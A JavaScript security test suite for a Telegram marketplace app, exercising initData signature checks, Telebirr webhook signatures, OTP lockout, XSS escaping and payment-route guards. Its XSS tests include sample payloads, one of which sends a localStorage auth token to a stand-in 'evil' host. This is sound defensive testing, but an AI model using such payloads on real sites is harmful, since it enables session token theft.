/**
 * Security tests — runs against the REAL production modules (the older
 * logic.test.js re-implements the functions it tests, which can pass while
 * the shipped code is broken).
 *
 * Run with: node src/tests/security.test.js
 */

const crypto = require('crypto');
const path = require('path');

let passed = 0;
let failed = 0;

function test(name, fn) {
  return Promise.resolve()
    .then(fn)
    .then(() => { console.log(`  ✅  ${name}`); passed++; })
    .catch((err) => { console.error(`  ❌  ${name}\n       ${err.message}`); failed++; });
}

function assert(cond, msg) { if (!cond) throw new Error(msg || 'assertion failed'); }

// ── Helpers shared with logic.test.js style vectors ─────────────────────────
function makeInitData(botToken, { user = { id: 12893412, first_name: 'Mike' }, authDate = Math.floor(Date.now() / 1000), tamper = false } = {}) {
  const params = new URLSearchParams({ auth_date: String(authDate), user: JSON.stringify(user) });
  const dataCheckString = Array.from(params.entries())
    .sort(([a], [b]) => a.localeCompare(b)).map(([k, v]) => `${k}=${v}`).join('\n');
  const secretKey = crypto.createHmac('sha256', 'WebAppData').update(botToken).digest();
  let hash = crypto.createHmac('sha256', secretKey).update(dataCheckString).digest('hex');
  if (tamper) hash = hash.replace(/.$/, c => (c === '0' ? '1' : '0'));
  params.set('hash', hash);
  return params.toString();
}

(async () => {
  // ═══ 1. Telegram initData verification — REAL middleware ═══
  console.log('\n🛡️  Telegram initData (real verifyTelegramInitData)');
  process.env.DATABASE_URL = process.env.DATABASE_URL || 'postgres://dummy:5432/test'; // pool is lazy
  const { verifyTelegramInitData } = require('../middleware/auth');
  const BOT = 'test_bot_token_xyz';

  await test('accepts a valid signed initData', () => {
    const r = verifyTelegramInitData(makeInitData(BOT), BOT);
    assert(r.valid === true, `expected valid, got ${JSON.stringify(r)}`);
    assert(r.user.id === 12893412, 'user id should parse');
  });

  await test('rejects a tampered hash', () => {
    const r = verifyTelegramInitData(makeInitData(BOT, { tamper: true }), BOT);
    assert(r.valid === false, 'tampered hash must be rejected');
  });

  await test('rejects wrong bot token', () => {
    const r = verifyTelegramInitData(makeInitData('other_token'), BOT);
    assert(r.valid === false, 'wrong token must fail');
  });

  await test('rejects initData older than 24h', () => {
    const old = Math.floor(Date.now() / 1000) - 90000;
    const r = verifyTelegramInitData(makeInitData(BOT, { authDate: old }), BOT);
    assert(r.valid === false && /expired/i.test(r.error), `expected expiry, got ${r.error}`);
  });

  await test('rejects malformed hash length (no crash on timingSafeEqual)', () => {
    const p = new URLSearchParams({ auth_date: String(Math.floor(Date.now() / 1000)), user: '{"id":1}', hash: 'abc' });
    const r = verifyTelegramInitData(p.toString(), BOT);
    assert(r.valid === false, 'short hash must be rejected without throwing');
  });

  // ═══ 2. Telebirr webhook signature — REAL util ═══
  console.log('\n🛡️  Telebirr signatures (real utils/telebirr)');
  const telebirr = require('../utils/telebirr');
  const SECRET = 'app_secret_123';

  await test('sign ⭢ verifySignature round-trip', () => {
    const payload = { outTradeNo: 'TBX-1-1', totalAmount: '1500.00', tradeStatus: 'SUCCESS' };
    payload.sign = telebirr.sign(payload, SECRET);
    assert(telebirr.verifySignature(payload, SECRET) === true, 'valid signature must verify');
  });

  await test('verifySignature does not mutate the payload', () => {
    const payload = { a: 1, b: 2 };
    payload.sign = telebirr.sign(payload, SECRET);
    telebirr.verifySignature(payload, SECRET);
    assert('sign' in payload, 'input must keep its sign field');
  });

  await test('rejects a forged signature', () => {
    const payload = { outTradeNo: 'TBX-1-1', tradeStatus: 'SUCCESS', sign: 'demo' };
    assert(telebirr.verifySignature(payload, SECRET) === false, 'forged sign must fail');
  });

  await test('rejects when the amount field is altered after signing', () => {
    const payload = { outTradeNo: 'TBX-1-1', totalAmount: '1500.00', tradeStatus: 'SUCCESS' };
    payload.sign = telebirr.sign(payload, SECRET);
    payload.totalAmount = '1.00'; // attacker edits after capture
    assert(telebirr.verifySignature(payload, SECRET) === false, 'post-sign tamper must fail');
  });

  await test('rejects missing/empty secret instead of trusting', () => {
    const payload = { a: 1, sign: 'x' };
    assert(telebirr.verifySignature(payload, '') === false, 'empty secret must never verify');
  });

  await test('amountsMatch handles decimal formatting', () => {
    assert(telebirr.amountsMatch('1500.00', 1500) === true, 'string vs number');
    assert(telebirr.amountsMatch(1499.999, 1500) === true, 'epsilon');
    assert(telebirr.amountsMatch(1499.0, 1500) === false, 'real mismatch');
    assert(telebirr.amountsMatch('abc', 1500) === false, 'non-numeric');
  });

  // ═══ 3. OTP brute-force counter — structural guard ═══
  console.log('\n🛡️  Phone OTP service (attempt-counter regression)');

  await test('wrong guesses increment attempts and lock out (source check)', () => {
    // The previous implementation queried by code value, so wrong guesses
    // never incremented attempts. Guard the structural property: the lookup
    // must NOT filter by the code value, and must increment attempts.
    const src = require('fs').readFileSync(path.join(__dirname, '../services/otp.js'), 'utf8');
    assert(!/WHERE\s+tg_user_id\s*=\s*\$1\s+AND\s+phone\s*=\s*\$2\s+AND\s+code\s*=\s*\$3/i.test(src),
      'verifyOtp must not look up by code value (attempts can never increment)');
    assert(/SET\s+attempts\s*=\s*attempts\s*\+\s*1/i.test(src), 'wrong guesses must increment attempts');
  });

  await test('OTP code generator produces 4-digit zero-padded numerics', () => {
    const { generateOTP } = require('../utils/otp');
    const seen = new Set();
    for (let i = 0; i < 200; i++) {
      const c = generateOTP(4);
      assert(/^\d{4}$/.test(c), `bad OTP shape: ${c}`);
      seen.add(c);
    }
    assert(seen.size > 150, 'OTP space should look random');
  });

  // ═══ 4. XSS escaping helper — REAL frontend module ═══
  console.log('\n🛡️  Frontend esc() XSS helper');
  const { esc, escUrl } = require('../../../public/js/utils/escape.js');

  await test('esc neutralizes classic stored-XSS payloads', () => {
    const xss = `<img src=x onerror="fetch('https://evil/'+localStorage.em_token)">`;
    const out = esc(xss);
    assert(!out.includes('<img'), 'tag must be neutralized');
    assert(!out.includes('"'), 'quotes must be escaped');
    assert(out.includes('&lt;img'), 'should contain escaped entities');
  });

  await test('esc handles quotes and backticks (attribute breakout)', () => {
    const out = esc(`');alert(1);//`);
    assert(!out.includes("'") && !out.includes('`'), 'quote breakout chars must be escaped');
  });

  await test('escUrl blocks javascript:/data-html/quote-breakout URLs', () => {
    assert(escUrl('javascript:alert(1)') === '', 'javascript: must be blocked');
    assert(escUrl('data:text/html,<script>alert(1)</script>') === '', 'data:text/html must be blocked');
    assert(escUrl("x');}</style><img src=x>", '') === '', 'CSS breakout must be blocked');
    assert(escUrl('https://cdn.example.com/img/a.jpg') === 'https://cdn.example.com/img/a.jpg', 'https allowed');
    assert(escUrl('data:image/png;base64,iVBOR') === 'data:image/png;base64,iVBOR', 'data:image allowed');
  });

  // ═══ 5. Payment hardening — structural source guards ═══
  console.log('\n🛡️  Payment flow hardening (source guards)');

  await test('buyer-facing checkout cannot mark orders paid by fabrication', () => {
    const src = require('fs').readFileSync(path.join(__dirname, '../../../public/js/views/checkout.js'), 'utf8');
    assert(!src.includes('TXN-${Date.now()}'), 'checkout must not fabricate transaction codes');
    const appSrc = require('fs').readFileSync(path.join(__dirname, '../../../public/js/app.js'), 'utf8');
    assert(!appSrc.includes('simulatePaymentSuccess ='), 'forged-webhook demo must stay removed');
  });

  await test('webhook has no environment/flag bypass for signatures', () => {
    const src = require('fs').readFileSync(path.join(__dirname, '../routes/payments.js'), 'utf8');
    assert(!src.includes('isTesting'), 'no isTesting bypass in webhook');
    assert(!src.includes('BYPASS_TELEGRAM_AUTH'), 'no auth-bypass flag in webhook');
    assert(src.includes('timingSafeEqual') || src.includes('verifySignature'), 'timing-safe signature verify required');
    assert(src.includes('amountsMatch'), 'amount integrity check required');
  });

  await test('confirm-tx cannot directly mark an order paid', () => {
    const src = require('fs').readFileSync(path.join(__dirname, '../routes/payments.js'), 'utf8');
    // The confirm-tx route body must not call markOrderPaid — only the bot
    // callback (seller) may. Find the route block textually.
    const routeStart = src.indexOf("router.post('/confirm-tx'");
    const routeEnd = src.indexOf("/**\n * Mark an order as paid", routeStart);
    const routeBody = src.slice(routeStart, routeEnd);
    assert(routeStart > -1 && routeEnd > routeStart, 'confirm-tx route should exist');
    assert(!routeBody.includes('markOrderPaid('), 'confirm-tx must not call markOrderPaid');
    assert(routeBody.includes("'verifying'"), 'confirm-tx must set payment_status=verifying');
  });

  await test('delivery routes enforce party authorization', () => {
    const src = require('fs').readFileSync(path.join(__dirname, '../routes/delivery.js'), 'utf8');
    const routes = ["'/:orderId/qr'", "'/:orderId/scan'", "'/:orderId/verify-otp'", "'/:orderId/verify-code'", "'/:orderId/receipt'", "'/:orderId/return'"];
    for (const r of routes) {
      const idx = src.indexOf(r);
      assert(idx > -1, `route ${r} should exist`);
      // each route block must contain a party check before res.json succeeds
      const block = src.slice(idx, idx + 4000);
      assert(/orderParties\(/.test(block) || /admin_tg_user_id !== req\.user\.tg_user_id/.test(block),
        `${r} must check caller is buyer/seller`);
    }
  });

  console.log(`\n──────────────────────────────────────────────────`);
  console.log(`  Results: ${passed} passed, ${failed} failed out of ${passed + failed} tests`);
  if (failed > 0) { console.log('  ❌  SECURITY TESTS FAILED'); process.exit(1); }
  console.log('  🎉  All security tests passed!');
})();
